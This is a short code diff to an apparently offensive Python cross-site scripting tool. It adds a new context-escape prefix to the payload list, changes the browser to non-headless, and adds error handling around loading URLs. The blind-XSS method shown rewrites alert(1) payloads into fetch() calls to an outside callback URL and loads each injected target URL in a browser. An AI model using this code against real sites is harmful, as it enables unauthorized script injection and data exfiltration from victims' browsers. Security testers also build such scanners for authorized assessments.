@@ -110,7 +110,7 @@ class xss:
             print("response doesn't have test")
     
     def escapePayload(self, payload):
-        escape = ['','">',"'>",'-->','</script>']
+        escape = ['','">',"'>",'-->','</script>',"'/>"]
         return [i+payload for i in escape]
 
     def escapElementPayload(self, payload):
@@ -175,7 +175,7 @@ class xss:
         return WebDriver(service=Service(webdriverPath), options=options)
         
     def xssBlind(self, escapeElement=None ):
-        driver = self.CreatWebDriver(HeadLess=True)
+        driver = self.CreatWebDriver(HeadLess=None)
         for i in self.payloads:
             i = i.replace('alert(1)', f'fetch("{self.blindUrl}")')
             if escapeElement:
@@ -184,10 +184,14 @@ class xss:
                 escapedPayloads = self.escapePayload(i)
             for p in escapedPayloads:
                 TargetUrl = self.TargetUrl.replace(self.GetXss, p)
-                print(TargetUrl)
-                driver.get(TargetUrl)
-                sleep(2)
-        
+                try:
+                    print(TargetUrl)
+                    driver.get(TargetUrl)
+                    sleep(2)
+                except:
+                    print("error in getting driver url")
+
+
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Xss script", add_help=False)
     parser.add_argument('--help', '-h', action='help', help='this is a help message')
